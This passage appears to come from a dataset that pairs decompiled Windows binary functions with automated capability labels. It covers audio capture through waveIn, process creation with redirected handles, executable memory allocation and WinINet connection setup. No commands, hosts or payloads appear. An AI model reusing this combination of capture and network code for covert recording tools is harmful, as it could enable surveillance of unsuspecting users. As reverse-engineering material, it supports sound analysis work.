        "decompiled_code": "\nvoid __cdecl fcn.0046d624(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uchar *in_EDX;\n    \n    fcn.0046d5bc();\n    *(in_EAX + 0x16b0) = 8;\n    if (arg_8h != 0) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = in_ECX;\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = in_ECX >> 8;\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = ~in_ECX;\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = ~in_ECX >> 8;\n    }\n    while (in_ECX != 0) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *in_EDX;\n        in_EDX = in_EDX + 1;\n        in_ECX = in_ECX + -1;\n    }\n    return;\n}\n",
        "token_count": 437
    },
    "0046ec70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046ec70(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack536;\n    uint uStack532;\n    uchar *puStack528;\n    uint uStack524;\n    uint uStack520;\n    uchar *puStack516;\n    uint uStack512;\n    uint uStack508;\n    uchar *puStack504;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack504 = &stack0xfffffffc;\n    puStack516 = &stack0xfffffffc;\n    uStack508 = 0x46ee1d;\n    uStack512 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe00;\n    uStack520 = 0x46ede1;\n    uStack524 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdf4;\n    puStack528 = 0x46ecbd;\n    fcn.0040546c();\n    puStack528 = 0x46ecc8;\n    fcn.0046d788();\n    puStack528 = 0x46ecd8;\n    fcn.00405738();\n    puStack528 = 0x46ece9;\n    fcn.00403764();\n    uStack532 = 0x46ed32;\n    uStack536 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffde8;\n    puStack528 = &stack0xfffffffc;\n    fcn.0046d788(0x80);\n    fcn.00405738();\n    uVar2 = fcn.004058fc();\n    sub.kernel32.dll_SetFileAttributesA();\n    *in_FS_OFFSET = uVar2;\n    uStack536 = 0x46ed47;\n    fcn.004034e8();\n    uStack536 = 0x46ed4c;\n    fcn.0040304c();\n    while( true ) {\n        uStack536 = 0x46ed8f;\n        fcn.00403a74();\n        uStack536 = 0x46ed94;\n        cVar1 = fcn.0040304c();\n        if (cVar1 != '\\0') break;\n        uStack536 = 0x46ed5c;\n        fcn.00403c7c();\n        uStack536 = 0x46ed67;\n        fcn.00403ce8();\n        uStack536 = 0x46ed6c;\n        fcn.0040304c();\n        uStack536 = 0;\n        uStack532 = 0x46ee50;\n        fcn.00405800(uVar2, 0);\n    }\n    uStack536 = 0x46eda3;\n    fcn.0040390c();\n    uStack536 = 0x46eda8;\n    fcn.0040304c();\n    uStack536 = 0x46edb6;\n    fcn.00409af4();\n    uStack536 = 0x46edcc;\n    fcn.00405504();\n    uStack536 = 0x46edd7;\n    fcn.004054c0();\n    *in_FS_OFFSET = uStack532;\n    *in_FS_OFFSET = uStack520;\n    uStack512 = 0x46ee24;\n    puStack516 = 0x46ee0f;\n    fcn.00405490();\n    puStack516 = 0x46ee1c;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 810
    },
    "0046f44c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0046f44c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack928;\n    uint uStack924;\n    uchar *puStack920;\n    uint lpSecurityAttributes;\n    uint var_380h;\n    uint var_37ch;\n    int32_t hHandle;\n    int32_t var_374h;\n    uint var_368h;\n    uint var_33ch;\n    uint var_338h;\n    int32_t var_330h;\n    int32_t var_32ch;\n    uint var_323h;\n    uint lpFileName;\n    uint var_119h;\n    int32_t hObject;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    puStack920 = 0x46f465;\n    cVar1 = fcn.0040a1e4();\n    if (cVar1 == '\\0') {\n        var_1h._0_1_ = 0;\n    }\n    else {\n        puStack920 = 0x46f47f;\n        fcn.0040a90c();\n        puStack920 = 0x46f48c;\n        fcn.0040a90c();\n        puStack920 = 0x46f499;\n        fcn.0040a90c();\n        uStack924 = 0x46f63b;\n        iStack928 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffc60;\n        puStack920 = &fcn.0046f44c::var_1h + 1;\n        fcn.00403aac();\n        lpSecurityAttributes = 0xc;\n        var_380h = 0;\n        var_37ch = 0xffffffff;\n        var_10h = sub.kernel32.dll_CreateFileA_1\n                            (&fcn.0046f44c::lpFileName, 0xc0000000, 3, &fcn.0046f44c::lpSecurityAttributes, 4, 0x100, 0)\n        ;\n        if (var_10h == -1) {\n            var_1h._0_1_ = 0;\n            fcn.00404f60();\n        }\n        else {\n            hObject = sub.kernel32.dll_CreateFileA_1\n                                (&fcn.0046f44c::var_323h, 0xc0000000, 3, &fcn.0046f44c::lpSecurityAttributes, 2, 0x100, \n                                 0);\n            if (hObject == -1) {\n                var_1h._0_1_ = 0;\n                fcn.00404f60();\n            }\n            else {\n                fcn.00403aac();\n                var_368h = 0x44;\n                var_33ch = 0x101;\n                var_338h._0_2_ = 0;\n                var_32ch = hObject;\n                var_330h = var_10h;\n                iVar2 = sub.kernel32.dll_CreateProcessA\n                                  (0, &fcn.0046f44c::var_119h, 0, 0, 0xffffffff, 0x110, 0, 0, &fcn.0046f44c::var_368h, \n                                   &fcn.0046f44c::hHandle);\n                var_1h._0_1_ = '\\x01' - (iVar2 == 0);\n                if (var_1h != '\\0') {\n                    iVar2 = hHandle;\n                    sub.kernel32.dll_WaitForSingleObject(hHandle, 0xffffffff);\n                    var_8h = hHandle;\n                    var_ch = var_374h;\n                    uVar3 = 0;\n                    *in_FS_OFFSET = iVar2;\n                    if (hObject != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(hObject, 0x46f642);\n                    }\n                    if (var_10h != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_10h);\n                    }\n                    if (var_ch != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_ch);\n                    }\n                    if (var_8h != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_8h);\n                    }\n                    return uVar3;\n                }\n                var_1h._0_1_ = 0;\n                fcn.00404f60();\n            }\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 1058
    },
    "0046f6ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_5ch\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Variable defined which should be unmapped: var_64h\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.0046f6ec(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uchar *var_68h;\n    uint *var_64h;\n    uint32_t var_60h;\n    uint *var_5ch;\n    uint *var_58h;\n    uint *var_54h;\n    uint *var_50h;\n    uint *var_4ch;\n    uint *var_48h;\n    uint32_t var_44h;\n    uint *var_40h;\n    uint32_t var_3ch;\n    uint *var_38h;\n    uint32_t var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    iVar3 = 0xd;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_18h = 0x46f70b;\n    var_14h = unaff_EDI;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    var_1ch = 0x46fc7f;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046f6ec::var_20h;\n    if (var_4h != 0) {\n        var_24h = *0x46fc90;\n        var_28h = &fcn.0046f6ec::var_2ch;\n        var_2ch = 0x46f741;\n        var_18h = &stack0xfffffffc;\n        fcn.0040eeb8(var_28h, var_24h);\n        var_2ch = 0x46f74c;\n        fcn.00405504();\n        var_2ch = *0x46fc90;\n        var_30h = &fcn.0046f6ec::var_30h;\n        var_34h = 0x46f76a;\n        fcn.0040eeb8(var_30h, var_2ch);\n        var_34h = 0x46f775;\n        fcn.00405504();\n        var_34h = 0x46f781;\n        piVar2 = fcn.00404610();\n        var_34h = 0x46f78d;\n        (**(*piVar2 + 0x90))();\n        var_34h = 0x46f797;\n        (**(*piVar2 + 0x2c))();\n        var_34h = 0x46f7a0;\n        (**(*piVar2 + 0x48))();\n        var_34h = 0x46f7a9;\n        (**(*piVar2 + 0x48))();\n        var_34h = 0x46f7b2;\n        (**(*piVar2 + 0x48))();\n        var_34h = 0x46f7bb;\n        (**(*piVar2 + 0x48))();\n        do {\n            var_24h = 0x46f7c7;\n            (**(*piVar2 + 0xc))();\n            var_24h = 0x46f7d2;\n            fcn.00409af4();\n            var_24h = 0x46f7dd;\n            fcn.00405504();\n            var_24h = &fcn.0046f6ec::var_8h;\n            var_28h = 0x46f7ee;\n            fcn.00405a48();\n            var_28h = 0x46f7fe;\n            fcn.00405964();\n            var_28h = 0x46f80b;\n            fcn.00405a48();\n            var_28h = 0x46f81a;\n            fcn.004059a4();\n            var_28h = 0x46f825;\n            fcn.00409af4();\n            var_28h = 0x46f830;\n            fcn.00405504();\n            var_28h = &fcn.0046f6ec::var_ch;\n            var_2ch = 0x46f841;\n            fcn.00405a48();\n            var_2ch = 0x46f851;\n            fcn.00405964();\n            var_2ch = 0x46f85e;\n            fcn.00405a48();\n            var_2ch = 0x46f86d;\n            fcn.004059a4();\n            var_2ch = 0x46f878;\n            fcn.00409af4();\n            var_2ch = 0x46f883;\n            fcn.00405504();\n            var_2ch = &fcn.0046f6ec::var_10h;\n            var_30h = 0x46f894;\n            fcn.00405a48();\n            var_30h = 0x46f8a4;\n            fcn.00405964();\n            var_30h = 0x46f8b1;\n            fcn.00405a48();\n            var_30h = 0x46f8c0;\n            fcn.004059a4();\n            var_30h = 0x46f8cb;\n            fcn.00409af4();\n            var_30h = 0x46f8d6;\n            fcn.00405504();\n            var_30h = &fcn.0046f6ec::var_14h;\n            var_34h = 0x46f8e7;\n            fcn.00405a48();\n            var_34h = 0x46f8f7;\n            fcn.00405964();\n            var_34h = 0x46f904;\n            fcn.00405a48();\n            var_34h = 0x46f913;\n            fcn.004059a4();\n            var_34h = 0x46f91e;\n            fcn.00409af4();\n            var_34h = 0x46f926;\n            fcn.00409e54();\n            var_34h = 0x46f92e;\n            fcn.0046f3dc();\n            var_34h = 0x46f93b;\n            cVar1 = fcn.0046f650();\n            if (cVar1 == '\\x01') {\n                var_34h = *0x46fce4;\n                var_38h = &fcn.0046f6ec::var_44h;\n                var_3ch = 0x46f95d;\n                fcn.0040eeb8(var_38h, var_34h);\n                var_3ch = 0x46f968;\n                fcn.00405504();\n                var_3ch = *0x46fce4;\n                var_40h = &fcn.0046f6ec::var_48h;\n                var_44h = 0x46f986;\n                fcn.0040eeb8(var_40h, var_3ch);\n                var_44h = 0x46f991;\n                fcn.00405504();\n                var_44h = *0x46fce4;\n                var_48h = &fcn.0046f6ec::var_4ch;\n                var_4ch = 0x46f9af;\n                fcn.0040eeb8(var_48h, var_44h);\n                var_4ch = 0x46f9ba;\n                fcn.00405504();\n            }\n            var_4ch = &fcn.0046f6ec::var_18h;\n            var_50h = 0x46f9cb;\n            fcn.00405a48();\n            var_50h = 0x46f9db;\n            fcn.00405964();\n            var_50h = 0x46f9e8;\n            fcn.00405a48();\n            var_50h = 0x46f9f7;\n            fcn.004059a4();\n            var_50h = 0x46fa00;\n            (**(*piVar2 + 0x48))();\n            var_50h = 0x46fa0b;\n            fcn.00409af4();\n            if (var_50h == NULL) {\n                var_50h = 0x46fa22;\n                cVar1 = fcn.0046f650();\n                if (cVar1 == '\\x01') {\n                    var_50h = *0x46fce4;\n                    var_54h = &fcn.0046f6ec::var_54h;\n                    var_58h = 0x46fa44;\n                    fcn.0040eeb8(var_54h, var_50h);\n                    var_58h = 0x46fa4f;\n                    fcn.00405504();\n                    var_58h = *0x46fce4;\n                    var_5ch = &fcn.0046f6ec::var_58h;\n                    var_60h = 0x46fa6d;\n                    fcn.0040eeb8(var_5ch, var_58h);\n                    var_60h = 0x46fa78;\n                    fcn.00405504();\n                    var_60h = *0x46fce4;\n                    var_64h = &fcn.0046f6ec::var_5ch;\n                    var_68h = 0x46fa96;\n                    fcn.0040eeb8(var_64h, var_60h);\n                    var_68h = 0x46faa1;\n                    fcn.00405504();\n                }\n                var_50h = 0x46faae;\n                fcn.00405504();\n                var_50h = &fcn.0046f6ec::var_1ch;\n                var_54h = 0x46fabf;\n                fcn.00405a48();\n                var_54h = 0x46facf;\n                fcn.00405964();\n                var_54h = 0x46fadc;\n                fcn.00405a48();\n                var_54h = 0x46faeb;\n                fcn.004059a4();\n                var_54h = *param_2;\n                var_58h = var_24h;\n                var_5ch = 0x46fd14;\n                var_60h = var_8h;\n                var_64h = 0x46fd14;\n                var_68h = var_18h;\n                fcn.00405800(0x46fd20, var_20h, 0x46fd14, var_10h, 0x46fd14, var_14h, 0x46fd14, var_1ch, 0x46fd14, \n                             var_ch, 0x46fd14);\n            }\n            else {\n                var_50h = 0x46fb4b;\n                cVar1 = fcn.0046f650();\n                if (cVar1 == '\\x01') {\n                    var_50h = *0x46fce4;\n                    var_54h = &fcn.0046f6ec::var_60h;\n                    var_58h = 0x46fb6d;\n                    fcn.0040eeb8(var_54h, var_50h);\n                    var_58h = 0x46fb78;\n                    fcn.00405504();\n                    var_58h = *0x46fce4;\n                    var_5ch = &fcn.0046f6ec::var_64h;\n                    var_60h = 0x46fb96;\n                    fcn.0040eeb8(var_5ch, var_58h);\n                    var_60h = 0x46fba1;\n                    fcn.00405504();\n                    var_60h = *0x46fce4;\n                    var_64h = &fcn.0046f6ec::var_68h;\n                    var_68h = 0x46fbbf;\n                    fcn.0040eeb8(var_64h, var_60h);\n                    var_68h = 0x46fbca;\n                    fcn.00405504();\n                }\n                var_50h = &fcn.0046f6ec::var_1ch;\n                var_54h = 0x46fbdb;\n                fcn.00405a48();\n                var_54h = 0x46fbeb;\n                fcn.00405964();\n                var_54h = 0x46fbf8;\n                fcn.00405a48();\n                var_54h = 0x46fc07;\n                fcn.004059a4();\n                var_54h = *param_2;\n                var_58h = var_24h;\n                var_5ch = 0x46fd14;\n                var_60h = var_8h;\n                var_64h = 0x46fd14;\n                var_68h = var_18h;\n                fcn.00405800(0x46fd20, var_20h, 0x46fd14, var_14h, 0x46fd14, var_10h, 0x46fd14, var_1ch, 0x46fd14, \n                             var_ch, 0x46fd14);\n            }\n            iVar3 = (**(*piVar2 + 0x14))();\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = var_20h;\n    var_18h = 0x46fc86;\n    var_1ch = 0x46fc7e;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 3527
    },
    "00470060": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00470060(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00403aac();\n    sub.msacm32.dll_acmStreamConvert(*(in_EAX + 0x104), in_EAX + 0x108, 4);\n    sub.msacm32.dll_acmStreamReset(*(in_EAX + 0x104), 0);\n    *(in_EAX + 0x100) = 0;\n    return *(in_EAX + 300);\n}\n",
        "token_count": 111
    },
    "00470330": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00470330(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xec) == '\\0') {\n        *(in_EAX + 0xf8) = param_2;\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "004703cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.004703cc(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    puVar1 = *0x4987c8;\n    if (*0x4987cc == NULL) {\n        puVar1 = sub.kernel32.dll_VirtualAlloc_1(0, 0x1000, 0x1000, 0x40);\n        *puVar1 = *0x4987c8;\n        fcn.004030ec();\n        uVar2 = fcn.004703c4();\n        *(puVar1 + 6) = uVar2;\n        puVar3 = puVar1 + 10;\n        do {\n            puVar4 = puVar3;\n            *puVar4 = 0xe8;\n            uVar2 = fcn.004703c4();\n            *(puVar4 + 1) = uVar2;\n            *(puVar4 + 5) = *0x4987cc;\n            puVar3 = puVar4 + 0xd;\n            *0x4987cc = puVar4;\n        } while ((puVar4 + 0xd) - puVar1 < 0xffc);\n    }\n    *0x4987c8 = puVar1;\n    puVar3 = *0x4987cc;\n    puVar1 = *0x4987cc + 5;\n    *0x4987cc = *(*0x4987cc + 5);\n    *puVar1 = arg_8h;\n    *(puVar3 + 9) = arg_ch;\n    return puVar3;\n}\n",
        "token_count": 375
    },
    "00470478": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00470478(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint lpWndClass;\n    code *var_24h;\n    \n    *0x4924fc = *0x4957f8;\n    iVar1 = sub.user32.dll_GetClassInfoA(*0x4957f8, *0x492510, &lpWndClass);\n    if ((iVar1 == 0) || (var_24h != sub.user32.dll_DefWindowProcA)) {\n        if (iVar1 != 0) {\n            sub.user32.dll_UnregisterClassA(*0x492510, *0x4957f8);\n        }\n        sub.user32.dll_RegisterClassA(0x4924ec);\n    }\n    uVar2 = fcn.004085a8(0, *0x4957f8, 0, 0, 0, 0, 0, 0, 0x80000000);\n    if (arg_8h._2_2_ != 0) {\n        uVar3 = fcn.004703cc(arg_8h, arg_ch);\n        sub.user32.dll_SetWindowLongA(uVar2, 0xfffffffc, uVar3);\n    }\n    return uVar2;\n}\n",
        "token_count": 295
    },
    "004705c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004705c4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack44;\n    int32_t iStack40;\n    uchar *puStack36;\n    uint uStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 4) == '\\0') {\n        uStack24 = 0x4706e5;\n        fcn.00470898();\n    }\n    else {\n        uStack24 = 0x20;\n        uStack32 = *(in_EAX + 0x94);\n        puStack36 = 0x4705f3;\n        iStack28 = param_2;\n        iVar1 = sub.winmm.dll_waveInUnprepareHeader();\n        if (iVar1 == 0) {\n            uVar2 = *(param_2 + 8);\n            if (*(in_EAX + 0xa2) != 0) {\n                puStack36 = 0x470615;\n                fcn.00402ef0();\n                iStack40 = 0x470661;\n                uStack44 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd4;\n                puStack36 = &stack0xfffffffc;\n                fcn.004030ec();\n                (**(in_EAX + 0xa0))();\n                *in_FS_OFFSET = uVar2;\n                iStack40 = 0x470668;\n                uStack44 = 0x470660;\n                fcn.00402f0c();\n                return;\n            }\n            *(param_2 + 4) = *(in_EAX + 0xc);\n            *(param_2 + 8) = 0;\n            *(param_2 + 0xc) = 0;\n            *(param_2 + 0x10) = 0;\n            *(param_2 + 0x14) = 0;\n            puStack36 = 0x4706a6;\n            fcn.00408594();\n            puStack36 = 0x20;\n            uStack44 = *(in_EAX + 0x94);\n            iStack40 = param_2;\n            iVar1 = sub.winmm.dll_waveInPrepareHeader();\n            if (iVar1 == 0) {\n                sub.winmm.dll_waveInAddBuffer(*(in_EAX + 0x94), param_2, 0x20);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 580
    },
    "004706ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004706ec(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t aiStack172 [3];\n    uchar *puStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint auStack144 [33];\n    \n    puVar3 = &stack0xffffff70;\n    for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *param_2;\n        param_2 = param_2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = *param_2;\n    if (*(in_EAX + 4) == '\\0') {\n        uStack148 = 0x10004;\n        uStack152 = 0;\n        uStack156 = *(in_EAX + 0x98);\n        puStack160 = &stack0xffffff70;\n        aiStack172[2] = 0;\n        aiStack172[1] = in_EAX + 0x94;\n        aiStack172[0] = 0x47072b;\n        iVar1 = sub.winmm.dll_waveInOpen();\n        if (iVar1 == 0) {\n            for (uVar2 = *(in_EAX + 0x91); uVar2 != 0; uVar2 = uVar2 - 1) {\n                aiStack172[0] = 0x470741;\n                fcn.00470830();\n            }\n            aiStack172[0] = *(in_EAX + 0x94);\n            iVar1 = sub.winmm.dll_waveInStart();\n            if (iVar1 == 0) {\n                puVar3 = &stack0xffffff54;\n                puVar4 = in_EAX + 0x10;\n                for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                *puVar4 = *puVar3;\n                *(in_EAX + 4) = 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 537
    },
    "004707cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004707cc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 4) != '\\0') {\n        *(in_EAX + 4) = 0;\n        sub.winmm.dll_waveInReset(*(in_EAX + 0x94));\n        sub.winmm.dll_waveInClose(*(in_EAX + 0x94));\n        *(in_EAX + 0x94) = 0;\n        iVar1 = *(*(in_EAX + 8) + 8) + -1;\n        if (-1 < iVar1) {\n            do {\n                fcn.0046fe5c();\n                fcn.00470898();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "00470824": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00470824(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) == '\\0') {\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "004708cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004708cc(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x4708e4;\n    fcn.004058ec();\n    puStack24 = 0x4708ec;\n    fcn.004058ec();\n    puStack24 = 0x4708f4;\n    fcn.004058ec();\n    puStack24 = 0x4708fc;\n    fcn.004058ec();\n    uStack28 = 0x4709a6;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    *0x4987d4 = sub.wininet.dll_InternetOpenA(0x4709b8, 0, 0, 0, 0);\n    if (*0x4987d4 != 0) {\n        uVar1 = fcn.004058fc(1, 0, 0);\n        uVar1 = fcn.004058fc(uVar1);\n        uVar1 = fcn.00409e54(uVar1);\n        uVar1 = fcn.004058fc(uVar1);\n        in_stack_ffffffac = *0x4987d4;\n        *0x4987d0 = sub.wininet.dll_InternetConnectA(*0x4987d4, uVar1);\n        if (*0x4987d0 != 0) {\n            *0x492518 = 1;\n            goto code_r0x00470983;\n        }\n    }\n    *0x492518 = 0;\ncode_r0x00470983:\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.00405490(0x4709ad);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 468
    },
    "004709c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004709c0(void)\n\n{\n    if (*0x492518 != '\\0') {\n        sub.wininet.dll_InternetCloseHandle(*0x4987d4);\n        sub.wininet.dll_InternetCloseHandle(*0x4987d0);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "004709e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
